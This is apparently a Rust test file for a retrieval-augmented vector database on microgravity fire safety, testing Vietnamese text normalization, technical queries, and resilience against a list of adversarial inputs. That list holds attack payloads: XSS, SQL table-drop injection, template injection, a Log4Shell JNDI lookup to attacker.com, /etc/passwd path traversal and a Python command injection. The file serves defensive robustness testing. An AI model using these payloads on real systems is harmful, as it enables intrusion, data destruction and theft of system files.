use nasa_rust::vector_db::{normalize_vn_text, NASAPsiVectorDB};

#[test]
fn test_text_normalization() {
    assert_eq!(normalize_vn_text(""), "");
    assert_eq!(normalize_vn_text("Tiếng Việt"), "tieng viet");
    assert_eq!(normalize_vn_text("Đốt Cháy Vi Trọng Lực"), "dot chay vi trong luc");
    assert_eq!(normalize_vn_text("NGHỊCH LÝ THÔNG GIÓ PMMA"), "nghich ly thong gio pmma");
}

#[test]
fn test_rag_adversarial_resilience() {
    let vdb = NASAPsiVectorDB::new();

    let malicious_payloads = [
        "<script>alert('XSS')</script>",
        "\"><svg onload=alert(1)>",
        "'; DROP TABLE materials; --",
        "{{7*7}}",
        "${jndi:ldap://attacker.com/a}",
        "../../../../../../etc/passwd",
        "\x00\x00\x00",
        &"A".repeat(10000), // Buffer overflow attempt
        "SELECT * FROM * WHERE 1=1",
        "{{config.items()}}",
        "__import__('os').system('dir')",
    ];

    for payload in &malicious_payloads {
        // 1. Vector search must not panic or crash
        let results = vdb.search(payload, 3);
        assert!(results.len() <= 3);

        // 2. Answer synthesis must return valid string
        let ans_en = vdb.synthesize_answer(payload, &results, "en");
        assert!(!ans_en.is_empty());

        let ans_vi = vdb.synthesize_answer(payload, &results, "vi");
        assert!(!ans_vi.is_empty());
    }
}

#[test]
fn test_rag_technical_queries() {
    let vdb = NASAPsiVectorDB::new();

    // Query 1: Water mist / suppression
    let res_water = vdb.search("water mist suppression in microgravity", 3);
    assert!(!res_water.is_empty());
    let ans_water = vdb.synthesize_answer("water mist suppression", &res_water, "en");
    assert!(ans_water.contains("PROHIBITED") || ans_water.contains("Water Mist"));

    // Query 2: PMMA airflow paradox
    let res_pmma = vdb.search("PMMA ventilation paradox burn rate", 3);
    assert!(!res_pmma.is_empty());
    let ans_pmma = vdb.synthesize_answer("PMMA ventilation paradox", &res_pmma, "vi");
    assert!(ans_pmma.contains("PMMA"));
}
